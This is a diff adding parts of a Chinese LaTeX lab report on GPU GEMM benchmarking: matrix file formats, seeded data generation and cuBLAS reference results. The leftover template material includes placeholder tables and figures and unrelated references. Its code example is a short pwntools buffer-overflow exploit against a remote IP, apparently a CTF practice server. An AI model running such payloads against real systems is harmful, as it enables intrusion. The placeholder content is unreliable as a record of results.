+\texttt{data/gen\_data.c} & 随机输入矩阵 $A$、$B$ 的生成程序 \\
+\texttt{data/gen\_cref.cu} & 调用 cuBLAS 计算 $C_{\mathrm{ref}}$ 并落盘 \\
+\texttt{data/Makefile} & 编译上述程序并批量生成数据 \\
+\texttt{data/N\{N\}.bin} & 输入文件（含 $A$、$B$） \\
+\texttt{data/N\{N\}\_cref.bin} & 标准结果文件（含 $C_{\mathrm{ref}}$） \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsubsection{二进制文件格式}
+
+每个规模对应一个文件 \texttt{N\{N\}.bin}，按行主序存储 \texttt{double} 型矩阵 $A$ 与 $B$。文件布局如表~\ref{tab:data-format} 所示：先写入固定长度的文件头 \texttt{MatDataHeader}，再依次写入 $A$ 的全部 $N^2$ 个元素与 $B$ 的全部 $N^2$ 个元素。文件头中的 \texttt{magic} 字段取 \texttt{0x47454D4D}（ASCII ``GEMM''），用于在读入时校验文件类型；\texttt{version} 当前为 1。
+
+\begin{table}[H]
+\small
+\centering
+\caption{\texttt{N\{N\}.bin} 二进制布局（行主序 \texttt{double}）}
+\label{tab:data-format}
+\begin{tabular}{llp{6.2cm}}
+\toprule
+\textbf{偏移内容} & \textbf{类型} & \textbf{含义} \\
+\midrule
+文件头 & \texttt{MatDataHeader} & 见表~\ref{tab:data-header} \\
+矩阵 $A$ & \texttt{double}[$N^2$] & 行主序 \\
+矩阵 $B$ & \texttt{double}[$N^2$] & 行主序 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{table}[H]
+\small
+\centering
+\caption{\texttt{MatDataHeader} 各字段}
+\label{tab:data-header}
+\begin{tabular}{llp{6.5cm}}
+\toprule
+\textbf{字段} & \textbf{类型} & \textbf{含义} \\
+\midrule
+\texttt{magic} & \texttt{uint32\_t} & 固定为 \texttt{0x47454D4D} \\
+\texttt{version} & \texttt{uint32\_t} & 格式版本，当前为 1 \\
+\texttt{n} & \texttt{int32\_t} & 方阵边长 $N$ \\
+\texttt{seed} & \texttt{uint32\_t} & 生成 $A$ 时使用的随机种子 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsubsection{随机数与可复现性}
+
+生成程序使用 C 标准库中的 \texttt{drand48()} 产生 $[0,1)$ 上的均匀随机数。全局基准种子设为 \texttt{20260616}；对规模为 $N$ 的文件，$A$ 的种子取 $\texttt{20260616} + N$，$B$ 的种子在此基础上再加 1。因此，各 $N$ 对应唯一且可复现的 $(A,B)$ 对，且不同规模之间的矩阵内容相互独立。由于本实验考察的是稠密 GEMM，矩阵元素的具体取值不影响 GPU 计算性能，固定种子仅用于保证实验可重复。
+
+\subsubsection{生成命令与产出}
+
+在实验节点 \texttt{dell-65} 上进入数据目录，执行 \texttt{make generate} 即可编译 \texttt{gen\_data} 并一次性生成表~\ref{tab:matmul-sizes} 所列全部规模的测试文件：
+
+\begin{lstlisting}[language=bash, caption={批量生成测试矩阵}]
+cd final/data
+make generate
+\end{lstlisting}
+
+等价于先编译 \texttt{gen\_data}，再执行：
+
+\begin{lstlisting}[language=bash]
+./gen_data 512 1024 2048 4096 8192
+\end{lstlisting}
+
+生成完成后，目录中出现 \texttt{N512.bin}、\texttt{N1024.bin}、\texttt{N2048.bin}、\texttt{N4096.bin} 与 \texttt{N8192.bin} 共五个文件；各文件大小约为 $(\lvert\texttt{MatDataHeader}\rvert + 2N^2 \times 8)$ 字节，其中 \texttt{N8192.bin} 约 1.0~GiB。表~\ref{tab:data-output} 汇总了本次生成的产出。
+
+\begin{table}[H]
+\small
+\centering
+\caption{已生成的测试数据文件}
+\label{tab:data-output}
+\begin{tabular}{rrr}
+\toprule
+\textbf{文件} & \textbf{规模 $N$} & \textbf{约略大小} \\
+\midrule
+\texttt{N512.bin}   & 512  & 4 MiB \\
+\texttt{N1024.bin}  & 1024 & 16 MiB \\
+\texttt{N2048.bin}  & 2048 & 64 MiB \\
+\texttt{N4096.bin}  & 4096 & 256 MiB \\
+\texttt{N8192.bin}  & 8192 & 1024 MiB \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+后续 benchmark 程序按 $N$ 分别读入 \texttt{N\{N\}.bin} 与 \texttt{N\{N\}\_cref.bin}，即可在固定输入上比较各实现的正确性与性能，无需在每次测试时重新生成随机矩阵或调用 cuBLAS 计算参考结果。
+
+\subsection{标准结果生成（cuBLAS）}
+
+\subsubsection{程序流程}
+
+在输入矩阵就绪后，使用 \texttt{gen\_cref.cu} 读取 \texttt{N\{N\}.bin}，将 $A$、$B$ 拷贝至 GPU，调用 cuBLAS 的 \texttt{cublasDgemm} 计算 $C_{\mathrm{ref}}=A\times B$，再将结果写回主机并保存为 \texttt{N\{N\}\_cref.bin}。该步骤在数据准备阶段\textbf{一次性}完成；后续正确性校验直接加载已保存的 $C_{\mathrm{ref}}$，不计入 kernel 性能测试时间。
+
+由于 cuBLAS 按列主序（column-major）接口约定存储矩阵，而本实验输入/输出均为行主序，程序采用等价变换
+\begin{equation}
+  (AB)^{\mathsf T} = B^{\mathsf T}A^{\mathsf T},
+\end{equation}
+在调用 \texttt{cublasDgemm} 时对 $A$、$B$ 使用转置操作，使 GPU 上列主序运算的结果与行主序意义下的 $C=AB$ 一致。计算在 \texttt{dell-65} 的单块 GPU（\texttt{CUDA\_VISIBLE\_DEVICES=0}）上执行。
+
+\subsubsection{参考结果文件格式}
+
+\texttt{N\{N\}\_cref.bin} 的布局如表~\ref{tab:cref-format} 所示：文件头 \texttt{MatCRefHeader} 的 \texttt{magic} 为 \texttt{0x47454D43}（ASCII ``GEMC''），随后为行主序 \texttt{double} 矩阵 $C_{\mathrm{ref}}$。
+
+\begin{table}[H]
+\small
+\centering
+\caption{\texttt{N\{N\}\_cref.bin} 二进制布局}
+\label{tab:cref-format}
+\begin{tabular}{llp{6.2cm}}
+\toprule
+\textbf{偏移内容} & \textbf{类型} & \textbf{含义} \\
+\midrule
+文件头 & \texttt{MatCRefHeader} & \texttt{magic}、\texttt{version}、\texttt{n} \\
+矩阵 $C_{\mathrm{ref}}$ & \texttt{double}[$N^2$] & 行主序 \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\subsubsection{生成命令与产出}
+
+在 \texttt{final/data/} 目录下，待 \texttt{N\{N\}.bin} 已存在时执行：
+
+\begin{lstlisting}[language=bash, caption={批量生成 cuBLAS 标准结果}]
+cd final/data
+make gen-cref
+\end{lstlisting}
+
+等价于：
+
+\begin{lstlisting}[language=bash]
+CUDA_VISIBLE_DEVICES=0 ./gen_cref 512 1024 2048 4096 8192
+\end{lstlisting}
+
+程序为每个规模生成对应的 \texttt{N\{N\}\_cref.bin}。表~\ref{tab:cref-output} 汇总本次产出；文件大小约为 $(\lvert\texttt{MatCRefHeader}\rvert + N^2 \times 8)$ 字节。
+
+\begin{table}[H]
+\small
+\centering
+\caption{已生成的标准结果文件}
+\label{tab:cref-output}
+\begin{tabular}{rrr}
+\toprule
+\textbf{文件} & \textbf{规模 $N$} & \textbf{约略大小} \\
+\midrule
+\texttt{N512\_cref.bin}   & 512  & 2 MiB \\
+\texttt{N1024\_cref.bin}  & 1024 & 8 MiB \\
+\texttt{N2048\_cref.bin}  & 2048 & 32 MiB \\
+\texttt{N4096\_cref.bin}  & 4096 & 128 MiB \\
+\texttt{N8192\_cref.bin}  & 8192 & 512 MiB \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+至此，每个测试规模 $N$ 均对应一组固定的 $(A,B,C_{\mathrm{ref}})$，可供后续矩阵乘法实现与 cuBLAS 的性能对比实验直接使用。
+
+
+\section{实验结果与分析}
+\label{sec:exp-result}
+
+
+
+
+
+
+\section{示例：结论}
+
+以下是结论
+
+\subsection{实验结果}
+
+这是一个表格，还有一个\href{https://blog.csdn.net/qq_40721108/article/details/134424063}{在Latex中插入链接}。
+
+\begin{table}[H]
+\small
+\caption{三线表使用实例}
+\centering
+\begin{tabular}{cccccc}
+\hline  
+\textbf{表头1} & \textbf{表头2} & \textbf{表头3} & \textbf{表头4} & \textbf{表头5} & \textbf{表头6} \\ 
+\hline  
+数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
+数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
+数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
+数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
+数据 & 数据  & 数据  & 数据  & 数据 & 数据\\
+\hline
+\end{tabular} 
+\end{table}
+
+\subsection{实验结论}
+
+这里是图片。
+
+\begin{figure}[H] %H为当前位置，!htb为忽略美学标准，htbp为浮动图形
+    \centering %图片居中
+    \includegraphics[width=0.8\textwidth]{example-image-2.png} %插入图片，[]中设置图片大小，{}中是图片文件名
+    \caption{example\_caption} %最终文档中希望显示的图片标题
+    \label{example_label} %用于文内引用的标签
+\end{figure}
+
+% 2*2四张子图示意
+\begin{figure}[htbp]
+  \begin{subfigure}{0.48\textwidth}
+    \includegraphics[width=\linewidth]{example-image-1.png}
+    \caption{示意图1} \label{fig:8a}
+  \end{subfigure}%
+  \hspace*{\fill}   % maximize separation between subfigures
+  \begin{subfigure}{0.48\textwidth}
+    \includegraphics[width=\linewidth]{example-image-1.png}
+    \caption{示意图2} \label{fig:8b}
+  \end{subfigure}\\
+  %\hspace*{\fill}   % maximizeseparation between subfigures
+  \begin{subfigure}{0.48\textwidth}
+    \includegraphics[width=\linewidth]{example-image-1.png}
+    \caption{示意图3} \label{fig:8c}
+  \end{subfigure}
+  \hspace*{\fill}   % maximize separation between subfigures
+  \begin{subfigure}{0.48\textwidth}
+    \includegraphics[width=\linewidth]{example-image-1.png}
+    \caption{示意图4} \label{fig:8d}
+  \end{subfigure}
+\caption{2*2四张子图示意} \label{fig:8}
+\end{figure}
+
+\section{代码}
+
+下面是一段Python代码。
+\begin{lstlisting}[language=Python,title={ans002.py}]
+from pwn import* #可能会报错 ，试试 python3  
+p = remote('111.200.241.244',49686)
+payload = 'a'*4 + p64(1853186401).decode("iso-8859-1") #本来没有后面的编码来着
+p.recvuntil("lets get helloworld for bof\n")
+p.sendline(payload)
+p.interactive()
+\end{lstlisting}
+
+下面是从文件导入的C代码。
+\lstinputlisting[language=C, title=test.c]{include_code/test.c}
+
+\end{spacing}
+
+\newpage
+
+% XSP 2023/3/16: bib支持不全，暂时改为手动
+\section*{参考文献} % section*生成无标号章节题目
+\hypersetup{urlcolor=black}
+\addcontentsline{toc}{section}{参考文献} % 将无标号章节添加至目录
+% 著作: [序号]作者．书名[标识码]．出版地：出版社，出版年．
+[1]张志建．严复思想研究[M]．桂林：广西师范大学出版社，1989． 
+
+% 译著: [序号]国名或地区（用圆括号）原作者．书名[标识码]．译者．出版地：出版社，出版年．
+[2]（英）霭理士．性心理学[M]．潘光旦译．北京：商务印书馆，1997．
+
+% 古典文献 文史古籍类引文后加序号，再加圆括号，内加注书名、篇名
+
+% 论文集: [序号]编者．书名[标识码]．出版地：出版社，出版年．
+[3]伍蠡甫．西方论文选（下册）[C]．上海：上海译文出版社，1979．
+
+% 期刊文章: [序号]作者．篇名[标识码]．刊名，年，（期）．
+[4]叶朗．《红楼梦》的意蕴[J]．北京大学学报（哲学社会科学版），1989，（2）
+
+% 报纸文章: [序号]作者．篇名[标识码]．报纸名，出版日期（版次）
+[5]谢希德．创造学习的新思路[N]．人民日报，1998-12-25（10）
+
+% 外文文献: 要求外文文献所表达的信息和中文文献一样多，但文献类型标识码可以不标出。
+[6]Mansfeld, R.S. \& Busse. \textit{T.V. The Psychology of creativity and discovery}, Chinago：
+NelsonHall, 1981
+
+[7]NVIDIA A100 Tensor Core GPU Architecture. Available: \url{https://images.nvidia.com/aem-dam/en-zz/Solutions/data-center/nvidia-ampere-architecture-whitepaper.pdf}
+
+% \begingroup
+% \setstretch{2.0}    %行距2
+% \setlength{\bibsep}{0pt}    %段前段后0
+% \begin{adjustwidth}{0.42cm}{0.42cm} %左右缩进0.42cm
+% \bibliography{references}
+% \end{adjustwidth}
+% \endgroup
+
+\end{document}
